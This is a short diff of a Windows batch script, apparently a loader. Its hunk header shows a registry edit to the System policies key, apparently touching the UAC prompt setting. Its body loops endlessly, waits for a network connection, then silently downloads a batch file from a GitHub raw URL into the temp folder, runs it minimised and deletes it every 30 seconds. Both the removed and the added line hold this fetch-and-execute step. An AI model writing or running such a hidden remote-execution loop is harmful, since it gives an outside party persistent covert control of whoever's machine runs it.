@@ -8,7 +8,7 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Prompt
 
 :loop
 powershell -Command "while (-not (Test-Connection google.com -Count 1 -Quiet)) { Start-Sleep 5 }"
-start /min powershell -Command "$url = 'https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat'; $tempPath = [System.IO.Path]::Combine($env:TEMP, 'run.bat'); Invoke-WebRequest -Uri $url -OutFile $tempPath; Start-Process $tempPath; Start-Sleep -Seconds 2; Remove-Item $tempPath"
+start /min powershell -Command "$url = 'https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat'; $tempPath = [System.IO.Path]::Combine($env:TEMP, 'run.bat'); Invoke-WebRequest -Uri $url -OutFile $tempPath; Start-Process $tempPath -Wait; Remove-Item $tempPath"
 timeout /t 30 /nobreak >nul
 REM Quay lại vòng lặp
 goto loop
